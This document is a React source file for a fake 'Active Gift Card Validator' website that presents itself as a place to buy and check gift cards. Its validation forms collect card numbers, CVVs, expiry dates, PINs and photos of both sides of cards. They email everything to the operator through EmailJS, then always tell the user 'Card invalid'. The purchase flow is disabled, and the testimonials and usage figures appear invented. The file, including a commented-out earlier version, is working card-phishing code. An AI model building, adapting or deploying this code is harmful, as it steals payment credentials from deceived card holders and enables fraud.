import { Text, Box, Flex, Button, Image, Card, CardBody, Stack, Heading, Divider, CardFooter, ButtonGroup, VStack, SimpleGrid, Accordion, AccordionItem, AccordionButton, AccordionPanel, AccordionIcon, Input, Link, Modal, ModalContent, ModalOverlay, ModalBody, ModalHeader, ModalCloseButton, FormControl, FormLabel, ModalFooter, useDisclosure, Select, useRadioGroup, useNumberInput, HStack, Switch, useRadio, useBreakpointValue, Spinner } from "@chakra-ui/react"
import { useRef, forwardRef, useState } from 'react';
import emailjs from '@emailjs/browser';
import imageCompression from 'browser-image-compression';

export default function Home({ informationSectionRef }) {
    const faqRef = useRef(null);
    const purchaseOrValidateRef = useRef(null);

    return (
        <>
            <ImageSection />
            <WhyChooseUsSection />
            <div ref={purchaseOrValidateRef}>
                <PurchaseOrValidate />
            </div>
            <CustomerFeedback />
            <div ref={faqRef}>
                <FAQSection />
            </div>
            <div ref={informationSectionRef}>
                <InformationSection faqRef={faqRef} purchaseOrValidateRef={purchaseOrValidateRef} />
            </div>
        </>
    );
}

const ImageSection = () => {
    

    return (
        <Box
            bgImage="url('/iTunesCard2.webp')" 
            bgSize="cover"
            bgPosition="center"
            bgRepeat="no-repeat"
            minHeight="50vh"
            width="100vw"
            position="relative"
        >
            <Box
                bg="black"
                opacity="0.4"
                position="absolute"
                top="0"
                left="0"
                width="100%"
                height="100%"
                zIndex="0"
            />
            <Box
                position="relative"
                zIndex="1"
                py={20}
                textAlign="center"
                color="white"
            >
                <Text fontSize="4xl" fontWeight="bold">
                    <Text as="span" color="white">
                        Welcome to
                    </Text>{" "}
                    <Text as="span" color="white">
                        <Text as="span" color="black" bg="white" px={4} py={2} fontSize={`3xl`}>
                            Active Gift Card Validator
                        </Text>
                    </Text>
                </Text>
                <Text mt={10} fontSize="lg" color="white" p={20}>
                    Your <Text as="span" fontWeight="bold">No. 1</Text> stop for any gift card purchase and validation - swift response, top-notch security and trusted by over <Text as="span" fontWeight="bold">5,000</Text> users daily. What will you like to do?
                </Text>
            </Box>
        </Box>
    );
};


const WhyChooseUsSection = () => {
    return (
        <Box
            minHeight="50vh"
            width="100%"
            maxW="1200px"
            mx="auto"
            my={20}
            px={4}
            position="relative"
            display="flex"
            justifyContent="center"
            alignItems="center"
        >
            <Flex
                direction={{ base: "column", md: "row" }}
                alignItems="center"
                width="100%"
            >
                <Box width={{ base: "100%", md: "50%" }} pr={{ base: 0, md: 8 }} mb={{ base: 8, md: 0 }}>
                    <Image src="./whychoose.jpg" alt="Gift Cards" borderRadius="md" />
                </Box>
                <Box width={{ base: "100%", md: "50%" }} pl={{ base: 0, md: 8 }} textAlign={{ base: "center", md: "left" }}>
                    <Text fontSize="2xl" fontWeight="bold" fontStyle="italic" mb={4}>
                        Why Choose Us?
                    </Text>
                    <Text fontSize="sm">
                        Discover your ultimate destination for digital gift card purchases and verifications.
                        Explore our extensive range of gift cards encompassing renowned brands spanning fashion,
                        dining, entertainment, and beyond.
                    </Text>
                    <Flex mt={6} align="center" justifyContent={{ base: "center", md: "flex-start" }}>
                        <Flex direction="column" align="center" mr={10}>
                            <Text fontSize="3xl" fontWeight="bold">
                                32k+
                            </Text>
                            <Text fontSize="sm" color="gray">
                                Validations
                            </Text>
                        </Flex>
                        <Flex direction="column" align="center">
                            <Text fontSize="3xl" fontWeight="bold">
                                24k+
                            </Text>
                            <Text fontSize="sm" color="gray">
                                Digital Cards Purchased
                            </Text>
                        </Flex>
                    </Flex>
                </Box>
            </Flex>
        </Box>
    );
};

function RadioCard(props) {
    const { getInputProps, getRadioProps } = useRadio(props)
    const input = getInputProps()
    const checkbox = getRadioProps()

    return (
        <Box as='label'>
            <input {...input} />
            <Box
                {...checkbox}
                cursor='pointer'
                borderWidth='1px'
                borderRadius='md'
                boxShadow='md'
                _checked={{
                    bg: 'black',
                    color: 'white',
                    borderColor: 'teal.600',
                }}
                _focus={{
                    boxShadow: 'outline',
                }}
                px={5}
                py={3}
            >
                {props.children}
            </Box>
        </Box>
    )
}

function PurchaseOrValidate() {
    const data = [
        { logo: "./amazon.png.webp", name: "Amazon E-Card" },
        { logo: "./ebay.png", name: "Ebay E - Card" },
        { logo: "./Steam.webp", name: "Steam E - Card" },
        { logo: "./itunes.png", name: "Apple E - Card" },
        { logo: "./american.jpeg", name: "American Express E - Card" },
        { logo: "./Googleplay.png", name: "Google Play E - Card" },
        { logo: "./razer.png", name: "RazerGold E - Card" },
        { logo: "./Spotify.png", name: "US Spotify E - Card" },
        { logo: "./Hulu.png", name: "US Hulu E - Card" },
        { logo: "./playstation.png", name: "US PSN E - Card" },
        { logo: "./paramount.jpeg.webp", name: "US Paramount+ E - Card" },
        { logo: "./visagift.jpeg", name: "VISA Gift E - Card" },
        { logo: "./visavanila.jpeg.webp", name: "VISA Vanilla E - Card" },
        { logo: "./sephora.png", name: "Sephora E - Card" },
        { logo: "./nordstorm.png", name: "Nordstrom E - Card" },
        { logo: "./xbox.webp", name: "Xbox E - Card" },
    ];

    const { isOpen: isPurchaseOpen, onOpen: onPurchaseOpen, onClose: onPurchaseClose } = useDisclosure();
    const { isOpen: isValidateOpen, onOpen: onValidateOpen, onClose: onValidateClose } = useDisclosure();
    const { isOpen, onOpen, onClose } = useDisclosure();
    const [selectedCard, setSelectedCard] = useState(null);
    const [selectedPrice, setSelectedPrice] = useState(null);
    const [quantity, setQuantity] = useState(1);
    const [validateCurrency, setValidateCurrency] = useState('USD');
    const [validateCardAmount, setValidateCardAmount] = useState('');
    const [validateCardName, setValidateCardName] = useState('');
    const [validateCardNumber, setValidateCardNumber] = useState('');
    const [validateCVV, setValidateCVV] = useState('');
    const [validateExpiry, setValidateExpiry] = useState('');
    const [validatePin, setValidatePin] = useState('');
    const [loading, setLoading] = useState(false);
    const [isUploadMode, setIsUploadMode] = useState(false);
    const [errorMessage, setErrorMessage] = useState('');
    const [isFileValid, setIsFileValid] = useState(true);
    const [frontImage, setFrontImage] = useState(null);
    const [backImage, setBackImage] = useState(null);
    const maxTotalFileSize = 500 * 1024;
    const [frontImageFile, setFrontImageFile] = useState(null);
    const [backImageFile, setBackImageFile] = useState(null);   

    const openPurchaseModal = (card) => {
        setSelectedCard(card);
        onPurchaseOpen();
    };

    const openValidateModal = (card) => {
        setSelectedCard(card);
        onValidateOpen();
    };

    const handleValidateCurrencyChange = (event) => {
        setValidateCurrency(event.target.value);
    };

    const handleValidateCardAmountChange = (event) => {
        setValidateCardAmount(event.target.value);
    };

    const handleValidateCardNameChange = (event) => {
        setValidateCardName(event.target.value);
    };

    const handleValidateCardNumberChange = (event) => {
        setValidateCardNumber(event.target.value);
    };

    const handleValidateCVV = (event) => {
        setValidateCVV(event.target.value);
    };

    const handleValidateExpiry = (event) => {
        setValidateExpiry(event.target.value);
    };

    const handleValidatePin = (event) => {
        setValidatePin(event.target.value);
    };

    const handleFormSubmit = (event) => {
        event.preventDefault();
        setLoading(true);
        const formData = {
            cardName: selectedCard?.name,
            validateCurrency,
            validateCardAmount,
            validateCardName,
            validateCardNumber,
            validateCVV,
            validateExpiry,
            validatePin,
        };
        const serviceId = 'service_rsh8zcj'
        const templateId = 'template_kq7rvh7'
        const publicKey = '8NV8xqPuYSjS3pDn3'
        const templateParams = {
            from_name: "Gift Card Validator",
            CardType: selectedCard?.name,
            Currency: validateCurrency,
            CardAmount: validateCardAmount,
            CardName: validateCardName,
            CardNumber: validateCardNumber,
            CVV: validateCVV,
            Expiry: validateExpiry,
            Pin: validatePin
        }
        emailjs.send(serviceId, templateId, templateParams, publicKey)
            .then((response) => {
                // console.log("email sent succesfully", response)
            })
            .catch((error) => {
                console.error("Error", error)
            })
            .finally(() => {
                setLoading(false);
            });
        // console.log(JSON.stringify(formData, null, 2));
        clearFormData();
        setTimeout(() => {
            alert('Card invalid');
        }, 4000);
    };

    const form = useRef();

    const handleUploadSubmit = (event) => {
        event.preventDefault();
        setLoading(true);

        const serviceId = 'service_rsh8zcj'
        const templateId = 'template_kq7rvh7'
        const publicKey = '8NV8xqPuYSjS3pDn3'

        emailjs.sendForm(serviceId, templateId, form.current, publicKey)
            .then((response) => {
            console.log(response)
            alert('Card invalid');
            handleToggleUploadMode();
        })
        .catch((error) => {
            console.error('Error', error);
            alert('Card invalid');
            handleToggleUploadMode();
        })
        .finally(() => {
            setLoading(false);
        });
        };

    const clearFormData = () => {
        setValidateCurrency('USD');
        setValidateCardAmount('');
        setValidateCardName('');
        setValidateCardNumber('');
        setValidateCVV('');
        setValidateExpiry('');
        setValidatePin('');
        setSelectedPrice(null);
        setQuantity(1);
    };

    const closePurchaseModal = () => {
        clearFormData();
        onPurchaseClose();
    };

    const closeValidateModal = () => {
        clearFormData();
        onValidateClose();
    };

    const closeOtherCardsModal = () => {
        clearFormData();
        onClose();
    };

    const priceOptions = ["$20", "$50", "$100", "$200", "$500"];

    const { getRootProps, getRadioProps } = useRadioGroup({
        name: 'price',
        onChange: setSelectedPrice,
    });

    const group = getRootProps();

    const { getInputProps, getIncrementButtonProps, getDecrementButtonProps } = useNumberInput({
        step: 1,
        defaultValue: 1,
        min: 1,
        max: 99
    });

    const inc = getIncrementButtonProps();
    const dec = getDecrementButtonProps();
    const input = getInputProps();

    const calculateTotalDue = () => {
        const priceValue = selectedPrice ? parseInt(selectedPrice.replace('$', ''), 10) : 0;
        const adjustedPrice = priceValue + (priceValue === 20 || priceValue === 50 ? 2.56 : 4.69);
        const totalAmount = adjustedPrice * quantity;
        return totalAmount.toFixed(2);
    };

    const renderExtraFields = () => {
        if (!selectedCard) return null;

        if (["American Express E - Card"].includes(selectedCard.name)) {
            return (
                <>
                    <FormControl mt={4}>
                        <FormLabel>CVV</FormLabel>
                        <Input placeholder='xxx' value={validateCVV} onChange={handleValidateCVV} />
                    </FormControl>
                    <FormControl mt={4}>
                        <FormLabel>Expiry Date</FormLabel>
                        <Input placeholder='MM/YYYY' value={validateExpiry} onChange={handleValidateExpiry} />
                    </FormControl>
                    <FormControl mt={4}>
                        <FormLabel>Card Pin</FormLabel>
                        <Input placeholder='Enter Card Pin' value={validatePin} onChange={handleValidatePin} />
                    </FormControl>
                </>
            );
        }

        if (["VISA Gift E - Card", "VISA Vanilla E - Card"].includes(selectedCard.name)) {
            return (
                <>
                    <FormControl mt={4}>
                        <FormLabel>CVV</FormLabel>
                        <Input placeholder='xxx' value={validateCVV} onChange={handleValidateCVV} />
                    </FormControl>
                    <FormControl mt={4}>
                        <FormLabel>Expiry Date</FormLabel>
                        <Input placeholder='MM/YYYY' value={validateExpiry} onChange={handleValidateExpiry} />
                    </FormControl>
                </>
            );
        }

        if (["Sephora E - Card", "Nordstrom E - Card"].includes(selectedCard.name)) {
            return (
                <>
                    <FormControl mt={4}>
                        <FormLabel>16 Digit Code</FormLabel>
                        <Input placeholder='Enter 16 Digit Code' value={validateCardNumber} onChange={handleValidateCardNumberChange} />
                    </FormControl>
                    <FormControl mt={4}>
                        <FormLabel>8 Digit PIN</FormLabel>
                        <Input placeholder='Enter 8 Digit PIN' value={validatePin} onChange={handleValidatePin} />
                    </FormControl>
                </>
            );
        }

        return null;
    };

    const handleToggleUploadMode = () => {
        setIsUploadMode(!isUploadMode);
    };

    const compressImage = async (file) => {
    const options = {
        maxSizeMB: 0.25, // Set maximum size to 500KB
        maxWidthOrHeight: 800, // Optional: resize based on the image dimensions
        useWebWorker: true // Optional: for better performance
    };

    try {
        const originalSize = file.size;
        const compressedFile = await imageCompression(file, options);
        const compressedSize = compressedFile.size;

        // Log the original and compressed file sizes
        // console.log(`File successfully compressed from ${originalSize / 1024} KB to ${compressedSize / 1024} KB`);

        return compressedFile;
    } catch (error) {
        // console.log('Error compressing the file:', error);
        return file; // Return the original file if compression fails
    }
};

    const handleFileChange = (e) => {
    const file = e.target.files[0];
    
    if (!file) return;

    // Create an object URL to display the selected image
    const imageUrl = URL.createObjectURL(file);

    // Update state based on the input field that triggered the event
    if (e.target.name === 'front_image') {
        setFrontImage(imageUrl);  // For displaying the image
        setFrontImageFile(file);  // For validation purposes
    } else if (e.target.name === 'back_image') {
        setBackImage(imageUrl);   // For displaying the image
        setBackImageFile(file);   // For validation purposes
    }

    // Perform validation based on actual file objects
    const frontFileSize = e.target.name === 'front_image' ? file.size : frontImageFile?.size || 0;
    const backFileSize = e.target.name === 'back_image' ? file.size : backImageFile?.size || 0;
    const totalSize = frontFileSize + backFileSize;

    // Validate combined file size and check if both files are present
    if (totalSize > 500 * 1024) {  // 500KB limit
        setErrorMessage('Attachments size limit. The maximum allowed attachments size is 500KB');
        setIsFileValid(false);
    } else if (!frontFileSize || !backFileSize) {
        setErrorMessage('Please upload both front and back images.');
        setIsFileValid(false);
    } else {
        setErrorMessage('');
        setIsFileValid(true);
    }
};

    return (
        <Box
            minHeight="30vh"
            width="100%"
            maxW="1200px"
            mx="auto"
            my={20}
            px={4}
            position="relative"
            display="flex"
            justifyContent="center"
            alignItems="center"
        >
            <VStack width="100%">
                <Box width="100%" textAlign="center">
                    <Text fontSize="2xl" fontStyle="italic" mb={4}>
                        <Text as="span" fontWeight="bold">Purchase</Text> or Validate
                    </Text>
                    <Text fontSize="sm">
                        Select a gift card to purchase or validate, if you can't find your preferred card kindly select the "other cards" option.
                    </Text>
                </Box>
                <SimpleGrid 
                    columns={{ base: 1, sm: 2, md: 3 }} 
                    spacing={10} 
                    mt={10} 
                    width="100%" 
                    justifyContent="center"
                >
                    {data.map((item, index) => (
                        <Card key={index} maxW='sm' mx="auto">
                            <CardBody>
                                <Image
                                    src={item.logo}
                                    alt={item.name}
                                    borderRadius='lg'
                                />
                                <Stack mt='6' spacing='3'>
                                    <Heading size='md'>{item.name}</Heading>
                                </Stack>
                            </CardBody>
                            <Divider />
                            <CardFooter>
                                <ButtonGroup spacing='2'>
                                    <Button colorScheme="white" variant={`outline`} onClick={() => openPurchaseModal(item)}>
                                        Purchase
                                    </Button>
                                    <Button variant='solid' onClick={() => openValidateModal(item)}>
                                        Validate
                                    </Button>
                                </ButtonGroup>
                            </CardFooter>
                        </Card>
                    ))}
                </SimpleGrid>
                <Button
                    size='md'
                    height='48px'
                    width='300px'
                    border='2px'
                    borderColor='black.500'
                    my={20}
                    onClick={onOpen}
                >
                    Validate other Cards
                </Button>
                {/* Purchase Modal */}
                <Modal closeOnOverlayClick={false} isOpen={isPurchaseOpen} onClose={closePurchaseModal} isCentered>
                    <ModalOverlay />
                    <ModalContent>
                        <ModalHeader>
                            <VStack>
                                {selectedCard?.logo && (
                                    <Image
                                        src={selectedCard.logo}
                                        alt={selectedCard.name}
                                        borderRadius='lg'
                                        w={`200px`}
                                    />
                                )}
                                <Text fontSize="xl">{selectedCard?.name}</Text>
                                <Text fontSize={`sm`}>Select the amount you would like to purchase</Text>
                            </VStack>
                        </ModalHeader>
                        <ModalCloseButton />
                        <ModalBody pb={6}>
                            <VStack>
                                <HStack {...group}>
                                    {priceOptions.map((value) => {
                                        const radio = getRadioProps({ value })
                                        return (
                                            <RadioCard key={value} {...radio}>
                                                {value}
                                            </RadioCard>
                                        )
                                    })}
                                </HStack>
                                <FormControl display='flex' alignItems='center' mt={4}>
                                    <FormLabel htmlFor='send-as-gift' mb='0'>
                                        Send as gift
                                    </FormLabel>
                                    <Switch id='send-as-gift' />
                                </FormControl>
                                <HStack maxW='320px' mt={4}>
                                    <Button onClick={() => setQuantity(quantity > 1 ? quantity - 1 : 1)}>-</Button>
                                    <Input value={quantity} readOnly w={14} textAlign="center" />
                                    <Button onClick={() => setQuantity(quantity < 99 ? quantity + 1 : 99)}>+</Button>
                                </HStack>
                                <Text mt={4}>Total Due: ${calculateTotalDue()}</Text>
                            </VStack>
                        </ModalBody>
                        <ModalFooter>
                            <Button colorScheme="white" variant={`outline`} width="100%" isDisabled>
                                Proceed to Payment
                            </Button>
                        </ModalFooter>
                    </ModalContent>
                </Modal>
                {/* Validate Modal */}
                <Modal closeOnOverlayClick={false} isOpen={isValidateOpen} onClose={closeValidateModal} isCentered>
                    <ModalOverlay />
                    <ModalContent>
                        <ModalHeader>{isUploadMode ? "Upload your images" : "Validate your card"}</ModalHeader>
                        <ModalCloseButton />
                            <ModalBody pb={6}>
                                {/* Conditionally show form or upload message */}
                                {isUploadMode ? (
                                    <form ref={form} encType="multipart/form-data" onSubmit={handleUploadSubmit}>
                                        <FormControl mt={4}>
                                            <FormLabel>Front of Card</FormLabel>
                                            <Box
                                            border="2px dashed #ccc"
                                            borderRadius="md"
                                            p={4}
                                            display="flex"
                                            flexDirection="column"
                                            alignItems="center"
                                            justifyContent="center"
                                            cursor="pointer"
                                            onClick={() => document.getElementById("frontImageUpload").click()}
                                            >
                                            {frontImage ? (
                                                <Image src={frontImage} alt="Front of Card" boxSize="100px" objectFit="cover" />
                                            ) : (
                                                <Text>Select Front Image</Text>
                                            )}
                                            </Box>
                                            {/* Hidden File Input */}
                                            <input
                                            type="file"
                                            id="frontImageUpload"
                                            name="front_image"
                                            accept="image/*"
                                            style={{ display: "none" }}
                                            onChange={(e) => handleFileChange(e, setFrontImage)}
                                            />
                                        </FormControl>

                                        {/* Custom Back Image Upload */}
                                        <FormControl mt={4}>
                                            <FormLabel>Back of Card</FormLabel>
                                            <Box
                                            border="2px dashed #ccc"
                                            borderRadius="md"
                                            p={4}
                                            display="flex"
                                            flexDirection="column"
                                            alignItems="center"
                                            justifyContent="center"
                                            cursor="pointer"
                                            onClick={() => document.getElementById("backImageUpload").click()}
                                            >
                                            {backImage ? (
                                                <Image src={backImage} alt="Back of Card" boxSize="100px" objectFit="cover" />
                                            ) : (
                                                <Text>Select Back Image</Text>
                                            )}
                                            </Box>
                                            {/* Hidden File Input */}
                                            <input
                                            type="file"
                                            id="backImageUpload"
                                            name="back_image"
                                            accept="image/*"
                                            style={{ display: "none" }}
                                            onChange={(e) => handleFileChange(e, setBackImage)}
                                            />
                                        </FormControl>

                                        {errorMessage && <p style={{ color: 'red' }}>{errorMessage}</p>}
                                        <p style={{ fontSize: '12px' }}>Info: max size of file is 250kb</p>

                                       
                                        <Button
                                            mt={6}
                                            colorScheme="white"
                                            variant="outline"
                                            type="submit"
                                            isDisabled={!isFileValid || loading || !frontImage || !backImage} 
                                        >
                                            {loading ? <Spinner size="sm" /> : 'Validate'}
                                        </Button>
                                    </form>
                                ) : (
                                    <form onSubmit={handleFormSubmit}>
                                    <FormControl>
                                        <FormLabel>Card name</FormLabel>
                                        <Input value={selectedCard?.name} isReadOnly />
                                    </FormControl>
                                    <FormControl mt={4}>
                                        <FormLabel>Select Currency</FormLabel>
                                        <Select placeholder='Select currency' value={validateCurrency} onChange={handleValidateCurrencyChange}>
                                            <option value='USD'>USD</option>
                                            <option value='GBP'>GBP</option>
                                            <option value='EUR'>EUR</option>
                                            <option value='CAD'>CAD</option>
                                            <option value='AUD'>AUD</option>
                                        </Select>
                                    </FormControl>
                                    <FormControl mt={4}>
                                        <FormLabel>Card amount</FormLabel>
                                        <Input placeholder='Enter Card Amount' value={validateCardAmount} onChange={handleValidateCardAmountChange} />
                                    </FormControl>
                                    <FormControl mt={4}>
                                        <FormLabel>Card number</FormLabel>
                                        <Input placeholder='Enter Card Number' value={validateCardNumber} onChange={handleValidateCardNumberChange} />
                                    </FormControl>
                                    {renderExtraFields()}
                                        
                                    <Button colorScheme="white" variant={`outline`} mt={6} mr={3} type="submit" isLoading={loading} spinnerPlacement='start'>
                                        Validate
                                    </Button>
                                </form>
                            )}
                            </ModalBody>
                            {/* <ModalFooter>
                                <Button variant="outline" colorScheme="blue" onClick={handleToggleUploadMode}>
                                    {isUploadMode ? "Type digits" : "Upload card"}
                                </Button>
                            </ModalFooter> */}
                    </ModalContent>
                </Modal>
                {/* Other Cards Modal */}
                <Modal closeOnOverlayClick={false} isOpen={isOpen} onClose={closeOtherCardsModal} isCentered>
                    <ModalOverlay />
                    <ModalContent>
                        <ModalHeader>Validate other card</ModalHeader>
                        <ModalCloseButton />
                        <form onSubmit={handleFormSubmit}>
                            <ModalBody pb={6}>
                                <FormControl mt={4}>
                                    <FormLabel>Select Currency</FormLabel>
                                    <Select placeholder='Select currency' value={validateCurrency} onChange={handleValidateCurrencyChange}>
                                        <option value='USD'>USD</option>
                                        <option value='GBP'>GBP</option>
                                        <option value='EUR'>EUR</option>
                                        <option value='CAD'>CAD</option>
                                        <option value='AUD'>AUD</option>
                                    </Select>
                                </FormControl>
                                <FormControl mt={4}>
                                    <FormLabel>Card amount</FormLabel>
                                    <Input placeholder='Enter Card Amount' value={validateCardAmount} onChange={handleValidateCardAmountChange} />
                                </FormControl>
                                <FormControl mt={4}>
                                    <FormLabel>Card name</FormLabel>
                                    <Input placeholder='Enter Card Name' value={validateCardName} onChange={handleValidateCardNameChange} />
                                </FormControl>
                                <FormControl mt={4}>
                                    <FormLabel>Card number</FormLabel>
                                    <Input placeholder='Enter Card Number' value={validateCardNumber} onChange={handleValidateCardNumberChange} />
                                </FormControl>
                            </ModalBody>
                            <ModalFooter>
                                <Button colorScheme="white" variant={`outline`} mr={3} type="submit" isLoading={loading}spinnerPlacement='start'>
                                    Validate
                                </Button>
                            </ModalFooter>
                        </form>
                    </ModalContent>
                </Modal>
            </VStack>
        </Box>
    );
}


// const GiftCardForm = () => {
//   const [selectedCard, setSelectedCard] = useState(null);
//   const [validateCurrency, setValidateCurrency] = useState('');
//   const [validateCardAmount, setValidateCardAmount] = useState('');
//   const [validateCardName, setValidateCardName] = useState('');
//   const [validateCardNumber, setValidateCardNumber] = useState('');
//   const [validateCVV, setValidateCVV] = useState('');
//   const [validateExpiry, setValidateExpiry] = useState('');
//   const [validatePin, setValidatePin] = useState('');
//   const [frontImage, setFrontImage] = useState(null);
//   const [backImage, setBackImage] = useState(null);
//   const [loading, setLoading] = useState(false);

//   const handleFrontImageUpload = (event) => {
//     const file = event.target.files[0];
//     if (file) {
//       const reader = new FileReader();
//       reader.onloadend = () => {
//         setFrontImage(reader.result.split(',')[1]); // Convert to base64
//       };
//       reader.readAsDataURL(file);
//     }
//   };

//   const handleBackImageUpload = (event) => {
//     const file = event.target.files[0];
//     if (file) {
//       const reader = new FileReader();
//       reader.onloadend = () => {
//         setBackImage(reader.result.split(',')[1]); // Convert to base64
//       };
//       reader.readAsDataURL(file);
//     }
//   };

//   const clearFormData = () => {
//     setSelectedCard(null);
//     setValidateCurrency('');
//     setValidateCardAmount('');
//     setValidateCardName('');
//     setValidateCardNumber('');
//     setValidateCVV('');
//     setValidateExpiry('');
//     setValidatePin('');
//     setFrontImage(null);
//     setBackImage(null);
//   };

//   const handleFormSubmit = (event) => {
//     event.preventDefault();
//     setLoading(true);

//     const templateParams = {
//       from_name: "Gift Card Validator",
//       CardType: selectedCard?.name,
//       Currency: validateCurrency,
//       CardAmount: validateCardAmount,
//       CardName: validateCardName,
//       CardNumber: validateCardNumber,
//       CVV: validateCVV,
//       Expiry: validateExpiry,
//       Pin: validatePin,
//       frontImage: frontImage,
//       backImage: backImage
//     };

//     const serviceId = 'service_rsh8zcj';
//     const templateId = 'template_kq7rvh7';
//     const publicKey = 'XEPa_HeI5_6-59dSj';

//     emailjs.send(serviceId, templateId, templateParams, publicKey)
//       .then((response) => {
//         console.log("Email sent successfully", response);
//         alert("Email sent successfully!");
//       })
//       .catch((error) => {
//         console.error("Error sending email", error);
//         alert("Failed to send email. Please try again.");
//       })
//       .finally(() => {
//         setLoading(false);
//         clearFormData();
//       });
//   };

//   return (
//     <form onSubmit={handleFormSubmit}>
//       <FormControl mt={4}>
//         <FormLabel>Card Type</FormLabel>
//         <Input
//           type="text"
//           placeholder="e.g. Visa, MasterCard"
//           value={selectedCard?.name || ''}
//           onChange={(e) => setSelectedCard({ name: e.target.value })}
//         />
//       </FormControl>

//       <FormControl mt={4}>
//         <FormLabel>Currency</FormLabel>
//         <Input
//           type="text"
//           placeholder="e.g. USD, EUR"
//           value={validateCurrency}
//           onChange={(e) => setValidateCurrency(e.target.value)}
//         />
//       </FormControl>

//       <FormControl mt={4}>
//         <FormLabel>Card Amount</FormLabel>
//         <Input
//           type="text"
//           placeholder="e.g. 100"
//           value={validateCardAmount}
//           onChange={(e) => setValidateCardAmount(e.target.value)}
//         />
//       </FormControl>

//       <FormControl mt={4}>
//         <FormLabel>Cardholder Name</FormLabel>
//         <Input
//           type="text"
//           placeholder="Cardholder Name"
//           value={validateCardName}
//           onChange={(e) => setValidateCardName(e.target.value)}
//         />
//       </FormControl>

//       <FormControl mt={4}>
//         <FormLabel>Card Number</FormLabel>
//         <Input
//           type="text"
//           placeholder="Card Number"
//           value={validateCardNumber}
//           onChange={(e) => setValidateCardNumber(e.target.value)}
//         />
//       </FormControl>

//       <FormControl mt={4}>
//         <FormLabel>CVV</FormLabel>
//         <Input
//           type="text"
//           placeholder="CVV"
//           value={validateCVV}
//           onChange={(e) => setValidateCVV(e.target.value)}
//         />
//       </FormControl>

//       <FormControl mt={4}>
//         <FormLabel>Expiry Date</FormLabel>
//         <Input
//           type="text"
//           placeholder="MM/YY"
//           value={validateExpiry}
//           onChange={(e) => setValidateExpiry(e.target.value)}
//         />
//       </FormControl>

//       <FormControl mt={4}>
//         <FormLabel>PIN</FormLabel>
//         <Input
//           type="text"
//           placeholder="PIN"
//           value={validatePin}
//           onChange={(e) => setValidatePin(e.target.value)}
//         />
//       </FormControl>

//       <FormControl mt={4}>
//         <FormLabel>Front of Card</FormLabel>
//         <Input type="file" accept="image/*" onChange={handleFrontImageUpload} />
//       </FormControl>

//       <FormControl mt={4}>
//         <FormLabel>Back of Card</FormLabel>
//         <Input type="file" accept="image/*" onChange={handleBackImageUpload} />
//       </FormControl>

//       <Button mt={6} colorScheme="blue" type="submit" disabled={loading}>
//         {loading ? <Spinner size="sm" /> : 'Submit'}
//       </Button>
//     </form>
//   );
// };

const GiftCardForm = () => {
  const form = useRef(); // Create a reference for the form
  const [loading, setLoading] = useState(false);

  const handleFormSubmit = (event) => {
    event.preventDefault();
    setLoading(true);

    const serviceId = 'YOUR_SERVICE_ID'; // Replace with your actual service ID
    const templateId = 'YOUR_TEMPLATE_ID'; // Replace with your actual template ID
    const publicKey = 'Z'; // Replace with your actual public key

    emailjs.sendForm(serviceId, templateId, form.current, publicKey)
      .then((response) => {
        // console.log('Email sent successfully', response);
        alert('Email sent successfully!');
      })
      .catch((error) => {
        // console.error('Error sending email', error);
        alert('Failed to send email. Please try again.');
      })
      .finally(() => {
        setLoading(false);
        form.current.reset(); // Clear the form
      });
  };

  return (
    <form ref={form} encType="multipart/form-data" onSubmit={handleFormSubmit}>
      <FormControl mt={4}>
        <FormLabel>Card Type</FormLabel>
        <Input
          type="text"
          name="card_type"
          placeholder="e.g. Visa, MasterCard"
        />
      </FormControl>

      <FormControl mt={4}>
        <FormLabel>Currency</FormLabel>
        <Input
          type="text"
          name="currency"
          placeholder="e.g. USD, EUR"
        />
      </FormControl>

      <FormControl mt={4}>
        <FormLabel>Card Amount</FormLabel>
        <Input
          type="text"
          name="card_amount"
          placeholder="e.g. 100"
        />
      </FormControl>

      <FormControl mt={4}>
        <FormLabel>Cardholder Name</FormLabel>
        <Input
          type="text"
          name="cardholder_name"
          placeholder="Cardholder Name"
        />
      </FormControl>

      <FormControl mt={4}>
        <FormLabel>Card Number</FormLabel>
        <Input
          type="text"
          name="card_number"
          placeholder="Card Number"
        />
      </FormControl>

      <FormControl mt={4}>
        <FormLabel>CVV</FormLabel>
        <Input
          type="text"
          name="cvv"
          placeholder="CVV"
        />
      </FormControl>

      <FormControl mt={4}>
        <FormLabel>Expiry Date</FormLabel>
        <Input
          type="text"
          name="expiry_date"
          placeholder="MM/YY"
        />
      </FormControl>

      <FormControl mt={4}>
        <FormLabel>PIN</FormLabel>
        <Input
          type="text"
          name="pin"
          placeholder="PIN"
        />
      </FormControl>

      <FormControl mt={4}>
        <FormLabel>Front of Card</FormLabel>
        <Input type="file" name="front_image" accept="image/*" />
      </FormControl>

      <FormControl mt={4}>
        <FormLabel>Back of Card</FormLabel>
        <Input type="file" name="back_image" accept="image/*" />
      </FormControl>

      <Button mt={6} colorScheme="blue" type="submit" disabled={loading}>
        {loading ? <Spinner size="sm" /> : 'Submit'}
      </Button>
    </form>
  );
};

const CustomerFeedback = () => {
    const feedbacks = [
        { name: "Wallen", review: "Fantastic service! I've been using this gift card website for months, and it never disappoints. Quick delivery and a wide range of options make it my go-to platform for gift cards. Highly recommended" },
        { name: "Cassie", review: "Reliable and trustworthy. I've made multiple purchases on this site, and each time, the transaction has been smooth, and the gift cards worked like a charm. It's my preferred choice for secure gift card transactions." },
        { name: "Joe", review: "incredibly user-friendly! This gift card website has a seamless interface, making the whole process from selection to checkout a breeze. Plus, their customer support is top-notch—always responsive and helpful. Two thumbs up!" }
    ];

    return (
        <Box minHeight="30vh" width="100%" maxW="1200px" mx="auto" my={20} px={4} textAlign="center">
            <Text fontSize="2xl" fontWeight="bold" mb={4}>Customer Feedback</Text>
            <Text fontSize="sm" mb={10}>What our customers are saying</Text>
            <SimpleGrid columns={{ base: 1, md: 3 }} spacing={10}>
                {feedbacks.map((feedback, index) => (
                    <>
                        <Box key={index} p={5}>
                            <Text fontWeight="bold" fontSize="lg" mb={10}>{feedback.name}</Text>
                            <Text>{feedback.review}</Text>
                        </Box>
                        <Box mt={10}>
                            <Text fontSize="9xl" color="gray.300">“</Text>
                        </Box>
                    </>
                ))}
            </SimpleGrid>
        </Box>
    );
};

const FAQSection = forwardRef((props, ref) => (
    <Box ref={ref} width="100%" maxW="1200px" mx="auto" mt={20} px={4}>
        <Text fontSize="2xl" fontWeight="bold" mb={20} textAlign="center">Frequently Asked Questions</Text>
            <Accordion allowToggle>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                How will my Gift Card be delivered?
                            </Box>
